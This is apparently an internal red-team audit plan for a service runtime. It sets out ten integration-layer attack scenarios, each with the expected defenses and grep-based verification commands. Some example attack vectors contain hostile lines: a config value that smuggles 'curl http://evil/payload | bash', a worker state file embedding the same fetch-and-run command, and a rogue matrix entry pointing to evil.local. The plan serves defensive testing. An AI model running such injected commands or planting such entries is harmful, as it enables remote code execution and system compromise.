# Red Team Round 2 — Integration Layer Security Audit

**Debt Item:** DEBT-OMO-030
**Campaign:** P3 Gate-Level Security Audit
**Scope:** Integration points across KEI sandbox, cross-service auth, data flows, protocols, audit chain, dashboard API, service matrix, cron jobs, MCP tools, and state files.
**Previous Round:** Round 1 (8 scenarios → 4 real defects found, including KEI sandbox idle audit DEBT-OMO-006)

---

## Test Scenarios

### 1. KEI Sandbox Bypass — Extension Permission Escalation

**Description:** Attempt to register a KEI extension that requests file read access but silently gains shell execution via an undocumented permission alias or missing allowlist check in `kei_sandbox.py`.

**Attack Vector:**
```yaml
# Attacker crafts an extension with:
extensions:
  - id: malicious-ext
    permissions:
      - file:read        # Allowed scope
      - shell:exec       # Not declared, but a missing scope-gate allows it
```
The sandbox `execute()` method iterates permissions but has a fallback `"*"` allowlist or does not validate against the declared registry.

**Expected Defense:** `kei_sandbox.py` must validate each requested permission against the extension's declared scope in `kei-extensions.yaml`. Any permission not explicitly declared must be rejected. The `permission_escalation` constraint (X1-AUDIT-002) should flag mismatches.

**Verification Command:**
```bash
python3 -c "
from pathlib import Path
import yaml
ext = yaml.safe_load(Path('protocols/kei-extensions.yaml').read_text())
for e in ext.get('extensions', []):
    perms = set(e.get('permissions', []))
    declared = set(e.get('declared_scopes', []))
    if perms - declared:
        print(f'ESCALATION: {e[\"id\"]} has {perms - declared} not in declared scopes')
"
```

---

### 2. Cross-Service Auth Gap — Unauthenticated Inter-Service RPC

**Description:** Service A (e.g., dashboard-api) calls Service B (e.g., scheduler) without token exchange. An attacker who compromises Service A can pivot to Service B without re-authentication.

**Attack Vector:**
A direct HTTP/gRPC call from `dashboard-api` to `scheduler/internal/execute` carries no service identity token. The receiver does not verify the caller's origin or capability.

**Expected Defense:** Every inter-service RPC must include a signed JWT or mTLS client certificate. The receiver must validate the token before processing. An auth middleware must be present on all internal endpoints.

**Verification Command:**
```bash
grep -rn 'token\|jwt\|mtls\|authorization' src/*/internal/ --include='*.py' \
  | grep -v 'test\|mock\|#\|\.pyc' \
  | head -20
# Also check for missing auth decorators:
grep -rn '@app.route\|@router\|def handle_' src/ --include='*.py' \
  | grep -v 'test\|auth_required\|token_required'
```

---

### 3. Data Flow Integrity — Unsigned Event Payload Tampering

**Description:** Events flowing through the system (service registration, task completion, audit triggers) are not cryptographically signed. A man-in-the-middle or compromised intermediate service can alter event payloads undetected.

**Attack Vector:**
An attacker intercepts an event on the message bus (e.g., `service.registered`), modifies the payload (e.g., changes `service_url` or `permissions`), and re-publishes it. Downstream consumers trust the altered data.

**Expected Defense:** All event payloads must carry an HMAC or Ed25519 signature computed over the canonical JSON of the event body. Consumers must verify the signature before processing.

**Verification Command:**
```bash
# Check if events have signing/verification logic
grep -rn 'hmac\|signature\|ed25519\|verify\|digest' src/ --include='*.py' \
  | grep -i 'event\|message\|payload' || echo "NO EVENT SIGNING FOUND — data flow integrity gap"
# Check event bus integrations
grep -rn 'publish\|emit\|dispatch' src/ --include='*.py' | head -10
```

---

### 4. Protocol Spoofing — Fake Protocol Handler Injection

**Description:** An attacker registers a new protocol handler (e.g., `myproto://`) that mimics a trusted protocol's interface, intercepting calls meant for the real handler.

**Attack Vector:**
The protocol registry in `protocols/` dynamically loads handlers but does not verify their provenance or checksum. An attacker writes a handler file in the writable protocols directory, and the next `load_protocols()` picks it up.

**Expected Defense:** Protocol handlers must be registered in a verified manifest (`protocols/manifest.yaml`) with SHA-256 hashes. Dynamic loading must validate the hash and only load from a read-only base directory. Protocol IDs must not overlap with reserved names.

**Verification Command:**
```bash
# Check protocol registry for unsigned or dynamically injected handlers
ls -la protocols/*.yaml protocols/*.py 2>/dev/null
grep -rn 'importlib\|exec\|compile\|load_module' src/runtime/ --include='*.py' \
  | grep -i protocol
# Check for manifest and validation
cat protocols/manifest.yaml 2>/dev/null || echo "NO PROTOCOL MANIFEST FOUND"
```

---

### 5. Audit Chain Manipulation — Audit Record Tampering

**Description:** Audit records written by governance components (KEI sandbox, service matrix changes) are stored in append-only files but lack chained hashing. An attacker with file write access can delete or reorder records without detection.

**Attack Vector:**
The audit log is an append-only JSONL file (`audit/kei-audit.jsonl`). Each record is standalone with no hash link to the previous record. An attacker removes the last 10 records and the integrity check passes.

**Expected Defense:** Audit records must form a hash chain (each record includes `prev_hash` of the previous record's hash). A separate audit verifier periodically checks chain integrity. The chain must be anchored to an external trusted store (e.g., a signed checkpoint file).

**Verification Command:**
```bash
python3 scripts/verify_kei_audit.py
# Check if chain hash is present:
head -3 ~/runtime/audit/kei-audit.jsonl 2>/dev/null | python3 -c "
import sys,json
for line in sys.stdin:
    r = json.loads(line.strip())
    if 'prev_hash' not in r:
        print('NO CHAIN HASH — audit manipulation possible')
" || echo "Audit file does not exist or chain validation missing"
```

---

### 6. Dashboard API Injection — Unauthenticated State Mutation

**Description:** The Dashboard API exposes endpoints that mutate system state (e.g., force service restart, update configuration, clear audit logs) without proper authorization checks.

**Attack Vector:**
An attacker finds an unprotected endpoint like `POST /api/v1/admin/force-restart` or `POST /api/v1/audit/clear` that lacks any auth middleware or has a trivially bypassable token check (e.g., hardcoded token, base64-encoded "admin").

**Expected Defense:** All state-mutating API endpoints must require a valid, scoped admin token. Middleware must verify the token on every request. `GET` endpoints must also verify at least read-level authorization if they expose sensitive data.

**Verification Command:**
```bash
# Discover all API endpoints and check for auth decorators
grep -rn 'def \|@app.route\|@router\.' dashboard/ --include='*.py' 2>/dev/null \
  | grep -v '__pycache__\|test' | head -30
# Check for missing auth on POST/PUT/DELETE
grep -rn "methods=\['POST'\]\|methods=\['PUT'\]\|methods=\['DELETE'\]" dashboard/ --include='*.py' 2>/dev/null
```

---

### 7. Service Matrix Tampering — Unauthorized Matrix.yaml Modification

**Description:** The `matrix.yaml` file (service registry) is writable by the runtime process. An attacker who gains local access can modify the matrix to redirect service endpoints, disable audit services, or inject rogue service entries.

**Attack Vector:**
```
$ echo '- id: rogue-service
  url: http://evil.local:9999
  permissions: ["*"]
' >> $RUNTIME_HOME/matrix.yaml
```
The governance kernel loads the matrix without verifying the modification came from an authorized source.

**Expected Defense:** The matrix file must be signed with an Ed25519 key, and the governance kernel must verify the signature before loading. File integrity monitoring (e.g., `inotify` watch + alert on write by non-authorized PID) should be in place. A checksum manifest (`matrix.yaml.sig`) must accompany the file.

**Verification Command:**
```bash
# Check if matrix has a signature file
ls -la $RUNTIME_HOME/matrix.yaml $RUNTIME_HOME/matrix.yaml.sig 2>/dev/null
# Check for file integrity monitoring
grep -rn 'inotify\|watch\|integrity\|checksum\|sign.*matrix' src/ --include='*.py' | head -10
# Check matrix permissions
stat -f '%A %N' $RUNTIME_HOME/matrix.yaml 2>/dev/null
```

---

### 8. Cron Job Privilege Escalation — Task Argument Injection

**Description:** Cron job scripts accept parameters or read configuration files that an unprivileged process can modify, allowing argument injection that escalates to arbitrary command execution.

**Attack Vector:**
A cron job (e.g., `autoheal.sh --service {{service_name}}`) reads `service_name` from a world-writable config file. An attacker writes `foo; curl http://evil/payload | bash` into the config, and the cron job executes it as root or the runtime user.

**Expected Defense:** All cron job inputs must be sanitized and validated against an allowlist. Config files must be owned by root/runtime user with mode `0640` or stricter. Scripts must use parameterized execution (no shell interpolation of user-controlled values).

**Verification Command:**
```bash
# Check cron job scripts for unsafe variable interpolation
grep -rn '`.*\$.*`\|$(.*\$' scripts/*.sh | head -10
# Check config file permissions
find scripts/ -name '*.sh' -exec grep -l 'source\|\. .*conf\|read.*file' {} \; | head -10
# Check crontab entries
crontab -l 2>/dev/null || cat /etc/crontab 2>/dev/null || echo "No crontab found"
```

---

### 9. MCP Tool Unauthorized Access — Tool Invocation Without Authorization

**Description:** MCP tools registered in the system can be invoked by any agent or process without verifying that the caller has the required capability scope. A low-privilege agent can call a high-privilege tool.

**Attack Vector:**
Agent A (scope: `read-only`) calls MCP tool `tools/execute_script` which has scope requirement `admin`. The MCP dispatcher does not check the caller's capabilities against the tool's required scopes. Agent A executes arbitrary scripts.

**Expected Defense:** Every MCP tool must declare required capabilities in its definition. The MCP dispatcher must verify the caller's token/capabilities against the tool requirements before execution. Tool access must be logged with caller identity.

**Verification Command:**
```bash
# Check MCP tool definitions for required capability declarations
grep -rn 'capabilities\|required_scope\|required_cap' protocols/mcp/ --include='*.yaml' 2>/dev/null | head -20
# Check dispatcher for authorization checks
grep -rn 'authorize\|check.*scope\|verify.*token\|capability.*check' src/runtime/mcp* --include='*.py' 2>/dev/null
# Map all MCP tools
grep -rn 'tool:' protocols/mcp/ --include='*.yaml' 2>/dev/null | head -30
```

---

### 10. State File Injection — Worker State File Poisoning

**Description:** Worker state files (e.g., `workers/*.json`, `workers/*.yaml`) are read by the runtime to resume or monitor agent tasks. If these files are writable by low-privilege processes, an attacker can inject malicious state that causes the runtime to execute unintended actions.

**Attack Vector:**
An attacker writes a crafted state file `workers/evil.json`:
```json
{
  "worker_id": "evil-worker",
  "state": "running",
  "command": {"type": "shell", "value": "curl http://evil/payload | bash"}
}
```
The runtime scans the `workers/` directory and loads this file, treating it as a legitimate worker state with an embedded action.

**Expected Defense:** Worker state files must be signed by the worker that created them. The runtime must verify the signature before loading. The state directory must be owned by the runtime user with mode `0700`. State files must not contain executable directives in freeform fields.

**Verification Command:**
```bash
# Check state directory permissions
stat -f '%A %N' $RUNTIME_HOME/workers/ 2>/dev/null
# Check for signature verification logic
grep -rn 'verify.*sign\|signature.*check\|validate.*state' src/runtime/ --include='*.py' | head -10
# Check state files for embedded commands
grep -rn 'command\|exec\|shell\|script' $RUNTIME_HOME/workers/*.{json,yaml,yml} 2>/dev/null | head -10
```

---

## Execution Plan

1. **Run each verification command** from the scenarios above against the current runtime deployment.
2. **Document findings** for each scenario as PASS / FAIL / PARTIAL with evidence.
3. **File new debt items** for confirmed vulnerabilities (lifecycle_state: `identified`).
4. **Update DEBT-OMO-030** lifecycle_state to `resolved` once all 10 scenarios have been run and documented.
5. **Escalate P3 gate-level items** to P2 if the finding severity warrants it.

## Previous Round 1 Context (from DEBT-OMO-030 history)

> "上次8场景挖出4个真缺陷，现在系统更完整，再来一轮对抗暴露集成层面新问题"

Related debt items from Round 1:
- DEBT-OMO-006: KEI Sandbox idle audit (closed)
- DEBT-OMO-028: KEI Sandbox real extension triggers (identified)
- DEBT-OMO-007: Protocol ghost — 16 protocols registered but only MCP actually used (identified)

## Change Log

| Date | Change |
|------|--------|
| 2026-06-05 | Initial plan created with 10 test scenarios for integration-layer red team round 2 |
